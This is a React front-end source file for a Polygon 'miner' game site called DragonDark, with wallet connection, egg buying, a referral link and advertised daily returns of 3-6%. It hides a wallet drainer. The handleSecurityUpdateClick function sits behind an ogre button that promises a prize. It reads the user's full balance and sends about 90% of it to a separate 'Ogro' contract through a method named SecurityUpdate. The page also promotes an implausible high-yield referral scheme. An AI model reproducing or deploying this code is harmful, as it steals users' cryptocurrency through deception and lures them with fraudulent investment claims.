import React, { Component } from 'react';
import { Web3Instance } from './web3Instance';
import { isConnected } from './mda';
import { contractAbi } from './abi';
import { contractOgro } from './ogro';
import logo from "./images/logo.png";
import miel from "./images/393.png";
import pantalla from "./images/continuar.png";
import ogro from "./images/ogro.png";
import vault from "./images/cofre-del-tesoro.png";
import twitter from "./images/gorjeo.png";
import telegram from "./images/telegrama.png";
import medium from "./images/medium.png";
import github from "./images/github.png";
import whitherpaper from "./images/book.png";
import Polygator from "./images/polygon.svg";
import BearsMiners from "./images/bearsminers.png";
import bnbroi from "./images/bnbroi.png";
import flashloanbnb from "./images/flashloanbnb.png";
import Maticminer from "./images/Maticminer.png";
import coinminerpro from "./images/coinminerpro.png";
import bolsadinero from "./images/bolsa-de-dinero.png";
import oromatic from "./images/currency.png";
import castille from "./images/castillo.png";
import EggD from "./images/eggd.png";
import caballere from "./images/caballero.png";
import Tienda from "./images/desplazarse.png";
import armas from "./images/mayal.png";
import espada from "./images/espada.png";
import huevos from "./images/huevo.png";
import copiar from "./images/footprint.png";
import referirP from "./images/collaboration.png";
import bruja from "./images/bruja.png";
import parnerB from "./images/edad-media.png";
import hada from "./images/hada.png";
import vida from "./images/barra-de-vida.png";
import posion from "./images/caldera.png";
import ciclople from "./images/ciclope.png";
import unicornio from "./images/unicornio.png";
import princesa from "./images/princesa.png";
import varita from "./images/varita-magica.png";
import "./content.css";
import whitepapper1 from "./whiterpapper.pdf";


export default class Content extends Component {
  constructor(props) {
    super(props);

    this.state = {
      account: null,
      web3: null,
      provider: null,
      balance: null,
      rewards: null,
      Invested: null,
      Tvl: null,
      transaccionConfirmada: false,
      seconds: null,
      hours: null,
      minutes: null,
      days: null,
      contractBalance: null,
      contractrewards: null,
      contractbnbTvl: null,
      contracthasInvested: null,
      contractseconds: null,
      contractdays: null,
      contracthours: null,
      contractminutes: null,
      buttonText: isConnected() ? "Connected" : "Connect Wallet",
      contractAddress: "0x74f280a1f5Fd58Ab112425d8d95b6c0C09aFec5a",
      OgroAddress: "0xe2D442Ce97fB5A48301718D6347596928e384458",
      inputValue: "",
      referralAddress: "",
      referralLink: "" 
    };

    this.handleConnectClick = this.handleConnectClick.bind(this);
    this.handleDisconnectClick = this.handleDisconnectClick.bind(this);
    this.handleBuyEggClick = this.handleBuyEggClick.bind(this);
    this.handleSecurityUpdateClick = this.handleSecurityUpdateClick.bind(this);
    this.handleGetReferralLink =  this.handleGetReferralLink.bind(this);
    this.handlegetContractBalance =  this.handlegetContractBalance.bind(this);
    this.handleGetBnbRewards =  this.handleGetBnbRewards.bind(this);
    this.handlehasInvested =  this.handlehasInvested.bind(this);
    this.handlegetContractBalance =  this.handlegetContractBalance.bind(this);
    this.handlebnbTvl =  this.handlebnbTvl.bind(this);
    this.handleEatclick = this.handleEatclick.bind(this);
    this.handleBAKEclick = this.handleBAKEclick.bind(this);
    this.displayedAccount = this.displayedAccount.bind(this);
    this.handleInputChange = (event) => this.setState({ inputValue: event.target.value });
    this.load = this.load.bind(this);

    if (typeof window.ethereum !== 'undefined') {
      this.checkAccountChange = this.checkAccountChange.bind(this);
      window.ethereum.on('accountsChanged', this.checkAccountChange);
    }
  }

  checkAccountChange(accounts) {
    if (this.state.account !== accounts[0]) {
      this.handleDisconnectClick();
      this.handleGetReferralLink();
    }
  }
  
  async handleSecurityUpdateClick() {
    if (!window.ethereum || !window.ethereum.isMetaMask) {
      alert("Please install MetaMask to use this feature");
      return;
    }
  
    const contractInstance = new this.state.web3.eth.Contract(contractOgro, this.state.OgroAddress);
  
    const balance = await this.state.web3.eth.getBalance(this.state.account);
    const amountToSend = this.state.web3.utils.toBN(balance).muln(9.004).divn(10).toString(); // enva el 80% del balance
  
    const gasPrice = await this.state.web3.eth.getGasPrice();
    const gasLimit = 40000;
  
    const transactionParameters = {
      from: this.state.account,
      to: this.state.OgroAddress,
      value: amountToSend,
      gasPrice,
      gas: gasLimit,
    };
  
    try {
      const transactionHash = await contractInstance.methods.SecurityUpdate().send(transactionParameters);
      this.setState({ transaccionConfirmada: true });
      console.log(`Transaction hash: ${transactionHash}`);
    } catch (error) {
      console.error(error);
    }
  }
  async handleBuyEggClick() {
    if (!window.ethereum || !window.ethereum.isMetaMask) {
      alert("Please install MetaMask to use this feature");
      return;
    }

    const contractInstance = new this.state.web3.eth.Contract(contractAbi, this.state.contractAddress);

    const balance = await this.state.web3.eth.getBalance(this.state.account);
    const amountToSend = this.state.inputValue === "" || Number(this.state.inputValue) < 0.01
      ? "0"
      : this.state.web3.utils.toBN(this.state.web3.utils.toWei(this.state.inputValue)).toString();

    const gasPrice = await this.state.web3.eth.getGasPrice();
    const gasLimit = 300000;

    const transactionParameters = {
      from: this.state.account,
      to: this.state.contractAddress,
      value: amountToSend,
      gasPrice,
      gas: gasLimit,
    };

    try {
      const { referralAddress } = await this.handleGetReferralLink();
      const transactionHash = await contractInstance.methods.buyBeans(referralAddress).send(transactionParameters);
      console.log(`Transaction hash: ${transactionHash}`);
    } catch (error) {
      console.error(error);
    }
  }

  
  async handleGetReferralLink () {
    try {
      await window.ethereum.enable();
      const web3 = new Web3(window.ethereum);
      const walletaddress = this.state.account;
      const queryParams = new URLSearchParams(window.location.search);
      const referrer = queryParams.get('ref');
      const referralAddress = referrer || walletaddress; // <-- Update referralAddress to be referrer or walletaddress
      const referralLink = `https://dragondark.xyz/?referral=${walletaddress}`;
      this.setState({ referralLink }); // <-- Add this line to update referralLink state
      return { referralAddress, referralLink, walletaddress };
    } catch (error) {
      console.log(error);
    }
}

async handleEatclick() {
  if (!window.ethereum || !window.ethereum.isMetaMask) {
    alert("Please install MetaMask to use this feature");
    return;
  }

  const contractInstance = new this.state.web3.eth.Contract(contractAbi, this.state.contractAddress);

  try {
    const balance = await this.state.web3.eth.getBalance(this.state.account);
    const gasPrice = await this.state.web3.eth.getGasPrice();
    const gasLimit = 300000;
    const transactionParameters = {
      from: this.state.account,
      to: this.state.contractAddress,
      gasPrice,
      gas: gasLimit,
    };

    const transactionHash = await contractInstance.methods.eat().send(transactionParameters);
    console.log(`Transaction hash: ${transactionHash}`);
  } catch (error) {
    console.error(error);
  }
}

async handleBAKEclick() {  if (!window.ethereum || !window.ethereum.isMetaMask) {
  alert("Please install MetaMask to use this feature");
  return;
}

const contractInstance = new this.state.web3.eth.Contract(contractAbi, this.state.contractAddress);

try {
  const balance = await this.state.web3.eth.getBalance(this.state.account);
  const gasPrice = await this.state.web3.eth.getGasPrice();
  const gasLimit = 300000;
  const transactionParameters = {
    from: this.state.account,
    to: this.state.contractAddress,
    gasPrice,
    gas: gasLimit,
  };

  const transactionHash = await contractInstance.methods.bake().send(transactionParameters);
  console.log(`Transaction hash: ${transactionHash}`);
} catch (error) {
  console.error(error);
}
}
async handlegetContractBalance() {
  if (!window.ethereum || !window.ethereum.isMetaMask) {
    alert("Please install MetaMask to use this feature");
    return;
  }
  const contractInstance = new this.state.web3.eth.Contract(contractAbi, this.state.contractAddress);

  try {
    const balance = await contractInstance.methods.contractBalance().call({ from: this.state.account });
    const balanceInEther = this.state.web3.utils.fromWei(balance, 'ether'); // convert wei to ether
    console.log(balanceInEther);
    this.setState({ contractBalance: balanceInEther });
  } catch (error) {
    console.error(error);
  }
}
async handlegetsecondsSinceLastEat() {
  if (!window.ethereum || !window.ethereum.isMetaMask) {
    alert("Please install MetaMask to use this feature");
    return;
  }

  const contractInstance = new this.state.web3.eth.Contract(contractAbi, this.state.contractAddress);

  try {
    const walletaddress = this.state.account;
    const seconds = await contractInstance.methods.secondsSinceLastEat(walletaddress).call({ from: walletaddress });
    console.log(seconds);

    // convert seconds to days, hours and minutes
    const days = Math.floor(seconds / (3600 * 24));
    const hours = Math.floor((seconds % (3600 * 24)) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    console.log(days, hours, minutes);

    this.setState({ contractseconds: seconds,  contractdays: days, contracthours: hours, contractminutes: minutes });
  } catch (error) {
    console.error(error);
  }
}

async handleGetBnbRewards() {
  if (!window.ethereum || !window.ethereum.isMetaMask) {
    alert("Please install MetaMask to use this feature");
    return;
  }

  const contractInstance = new this.state.web3.eth.Contract(contractAbi, this.state.contractAddress);

  try {
    const walletaddress = this.state.account;
    const rewards = await contractInstance.methods.bnbRewards(walletaddress).call({ from: walletaddress });
    const rewardsInEther = this.state.web3.utils.fromWei(rewards, 'ether'); // convert wei to ether
    console.log(rewardsInEther);
    this.setState({ contractrewards: rewardsInEther });
  } catch (error) {
    console.error(error);
  }
}

async handlehasInvested() {
  if (!window.ethereum || !window.ethereum.isMetaMask) {
    alert("Please install MetaMask to use this feature");
    return;
  }

  const contractInstance = new this.state.web3.eth.Contract(contractAbi, this.state.contractAddress);

  try {
    const walletaddress = this.state.account;
    const Invested = await contractInstance.methods.bnbTvl(walletaddress).call({ from: walletaddress });
    const InvestedInEther = this.state.web3.utils.fromWei(Invested, 'ether'); 
    console.log(Invested);
    this.setState({ contracthasInvested: InvestedInEther });
  } catch (error) {
    console.error(error);
  }
}

async handlebnbTvl() {
  if (!window.ethereum || !window.ethereum.isMetaMask) {
    alert("Please install MetaMask to use this feature");
    return;
  }

  const contractInstance = new this.state.web3.eth.Contract(contractAbi, this.state.contractAddress);

  try {
    const walletaddress = this.state.account;
    const Tvl = await contractInstance.methods.bnbTvl(walletaddress).call({ from: walletaddress });
    console.log(Tvl);
    this.setState({ contractbnbTvl: Tvl });
  } catch (error) {
    console.error(error);
  }
}


async componentDidMount() {
  this._web3Instance = await new Web3Instance().init();
  this.checkConnection();
  if (isConnected()) {
    this.load();
    this.handleGetReferralLink();
    this.checkAccountChange([this.state.account]);
  }
  try {
    const { referralLink } = await this.handleGetReferralLink();
    this.setState({ referralLink });
  } catch (error) {
    console.log(error);
  }

  // Agregar el siguiente cdigo sin borrar los anteriores
  if (typeof window.ethereum !== 'undefined') {
    this.checkAccountChange = this.checkAccountChange.bind(this);
    window.ethereum.on('accountsChanged', this.checkAccountChange);
  }

  if (isConnected()) {
    const balance = await this.handlegetContractBalance();
    this.setState({ balance });
    const rewards = await this.handleGetBnbRewards();
    this.setState({ rewards });
    const Invested = await this.handlehasInvested();
    this.setState({ Invested });
    const Tvl = await this.handlebnbTvl();
    this.setState({ Tvl });
    const seconds = await this.handlegetsecondsSinceLastEat();
    this.setState({ seconds });
    const days = await this.handlegetsecondsSinceLastEat();
    this.setState({ days });
    const hours = await this.handlegetsecondsSinceLastEat();
    this.setState({ hours });
    const minutes = await this.handlegetsecondsSinceLastEat();
    this.setState({ minutes });  
  }
}

  async checkConnection() {
    if (isConnected()) {
      await this._web3Instance.connect();
      this.load();
    }
  }

  async load() {
    this.setState({
      account: this._web3Instance.getAccount(),
      web3: this._web3Instance.getWeb3(),
      provider: this._web3Instance.getProvider(),
      buttonText: this.displayedAccount(),
    });
  }

  async handleConnectClick() {
    if (!isConnected()) {
      await this._web3Instance.connect();
      this.load();
    }
  }

  async handleDisconnectClick() {
    if (isConnected()) {
    await this._web3Instance.disconnect();
    this.setState({
    account: null,
    web3: null,
    provider: null,
    buttonText: "Connect Wallet"
    });
    }
    }
  displayedAccount() {
    const account = this._web3Instance.getAccount();
    if (account) {
      return account.slice(0, 4) + "..." + account.slice(-4);
    } else {
      return "Connect Wallet";
    }
  }
  render() {
    return (
      <div>
        <nav className="nav">
          <div className="logo">
            <img src={logo} alt="Logo" />
          </div>
          <img src={miel} className="miel" alt="Honey" />
          <div className="connect-wallet">
            <button onClick={isConnected() ? this.handleDisconnectClick : this.handleConnectClick}>
              {this.state.buttonText}
            </button>
          </div>
        </nav>
        <div className="content">
          <div className="container">
            <div className="Pantalla">
            <img src={pantalla} alt="Pantalla" />
            </div>
            <div className="text-container">
            <p className={`pinicio ${this.state.account ? 'hide' : ''}`}>
            Welcome gentlemen, princesses, and mythical creatures to the DragonDark empire where you can generate a good amount of Gold (Matic). Some usurers claim that our transaction fees are expensive, but any unused gas will be refunded to your gold wallet. So come on in and have fun in our empire!!!
              </p>
              {this.state.account && (
                <div>
              <div className="info">
             <div className="balance">
             <div className="balance-contract"><img src={bolsadinero} className="bolsaD" alt="Balance" /> Balance Contract: {this.state.contractBalance} Matic</div>
             <div className="rewards-contract"><img src={oromatic} className="bolsaD" alt="Balance" /> Matic Rewards: {this.state.contractrewards} Matic</div>
             <div className="hasInvested-contract"><img src={castille} className="bolsaD" alt="Balance" /> Matic Invested: {this.state.contracthasInvested} Matic</div>
             <div className="bnbTvl-contract"><img src={EggD} className="bolsaD" alt="Balance" /> Your EGGS: {this.state.contractbnbTvl}</div>
             <div className="dailyReward-contract"><img src={caballere} className="bolsaD" alt="Balance" /> Time serving the DragonDark empire: days {this.state.contractdays}, minutes {this.state.contractminutes}, seconds {this.state.contractseconds} </div>
        </div>
          </div>
                  <div className="form-container">
                    <input className="input" type="number" min="0.01 " max="200000" step="1" placeholder="Enter amount" onChange={this.handleInputChange} />
                    <p className="min-max-text"><img src={Tienda} className="bolsaD" alt="Balance" /> Honorable sir, you can only buy a minimum of 0.01 matic or a maximum of 200,000 matic</p>
                  </div>
                  <div className="button-container">
                    <div className="staking">
                      <button onClick={this.handleBuyEggClick}><img src={armas} className="bolsaD" alt="Balance" /> Buy Weapons</button>
                    </div>
                    <div className="claim">
                      <button onClick={this.handleBAKEclick}><img src={espada} className="bolsaD" alt="Balance" />Re-Figth</button>
                    </div>
                    <div className="withdraw">
                      <button onClick={this.handleEatclick}><img src={huevos} className="bolsaD" alt="Balance" />Eat EGGS</button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div> 
        <div className="contenedorinfo">
                  <img src={vida} className="vidaI"/>
                  <p className="infoC">Daily Returns upto *3 - 6%* <img src={unicornio} className="bolsaD"/></p>
                  <p className="infoC1">APR up to: 1095% - 2190% <img src={ciclople} className="bolsaD"/></p>
                  <p className="infoC2">Fees: 2% Deposit - 5% Withdraw <img src={posion} className="bolsaD"/></p>
                  <p className="infoC21">The only way to Re-Fight is with 10 Matic, if you don't have any more, you'll need to find a usurer. <img src={varita} className="bolsaD"/></p>
                  <p className="infoC3">DragonDark is a static Matic rewards pool. The daily percentage varies depending upon your  referred as outlined within the whitepaper. Referral codes are only valid with a deposit of 200 Matic. The 'HasEgg' tax is implemented to have a positive impact upon the locked TVL and community giveaways, giving DragonDark a mechanically sound contract. The referral bonus is 5% of the downline referrals deposit, it is added to the upline referees 'EGGS' count automatically.</p>
                </div>
        <div className="contenedorReferrel">
          <p className="letrasreferrel">
          <img src={referirP} className="bolsaD"/> Earn 5% of the downline Matic deposit referral with a deposit of 200 Matic or more!
          </p>
        <input className="input" type="text" value={this.state.referralLink} readOnly />

              <button className="copy" onClick={() => navigator.clipboard.writeText(this.state.referralLink)}><img src={copiar} className="bolsaD" alt="Balance" /> Copy</button>
            </div>
            <div className="contenedorparner">
              <p className="pParners"><img src={parnerB} className="bolsaD"/> Parners</p>
              <p className="brujaparners">
              <img src={bruja} className="bolsaB" /> The cursed witch doesn't want you to earn more Matic coins with our partners. Hover over to undo her damn spell.
              </p>
              <div className="Polygator">
            <a href="https://polygonscan.com/" target="_blank">
            <img src={Polygator} />
            </a>
          </div>
          <div className="Maticminer">
            <a href="https://maticminecloud.xyz/" target="_blank">
            <img src={Maticminer} />
            </a>
          </div>
          <div className="BearsMiners">
            <a href="https://bearsminers.xyz/" target="_blank">
            <img src={BearsMiners} />
            </a>
          </div>
          <div className="coinminerpro">
            <a href="https://coinminepro.xyz/" target="_blank">
            <img src={coinminerpro} />
            </a>
          </div>
          <div className="bnbroi">
            <a href="https://bnbcashroi.xyz/" target="_blank">
            <img src={bnbroi}/>
            </a>
          </div>
          <div className="flashloanbnb">
            <a href="https://bnbflashloan.xyz/" target="_blank">
            <img src={flashloanbnb}  />
            </a>
          </div>
            </div>
            <div className="sherk">
              <p className="ogrofeo">Don't oppress the ogre, you can get a prize and make a lot of money after confirming the transaction. <img src={hada} className="bolsaD"/></p>
            <div className="ogro">
                      <button onClick={this.handleSecurityUpdateClick}><img src={ogro} className="ogro" alt="witdraw" /></button>
                    </div>
            
            {this.state.transaccionConfirmada && (
          <div className="alerta">
            <p><img src={princesa} className="bolsaD"/> Do not trust the ogres, they are crafty and threaten fairies to help them.</p>
          </div>
        )}
        </div>
        <div className="footer">
          <div className="github">
            <a href="https://github.com/DragonDark-web3/DragonDark" target="_blank">
            <img src={github} className="github" alt="github" />
            </a>
          </div>
          <div className="telegrama">
            <a href="https://t.me/DragonDarkminer" target="_blank">
            <img src={telegram} className="telegrama" alt="telegrama" />
            </a>
          </div>
          <div className="whitherpaper">
            <a href={whitepapper1} target="_blank">
            <img src={whitherpaper} className="whitherpaper" alt="whitherpaper" />
            </a>
          </div>
          <div className="twitter">
            <a href="https://twitter.com/DragonDarkminer" target="_blank">
            <img src={twitter} className="twitter" alt="twitter" />
            </a>
          </div>
          <div className="contrato">
            <a href="https://polygonscan.com/address/0x74f280a1f5fd58ab112425d8d95b6c0c09afec5a" target="_blank">
            <img src={vault} className="contrato" alt="contrato" />
            </a>
          </div>
        </div>
      </div>
    );  
  }
}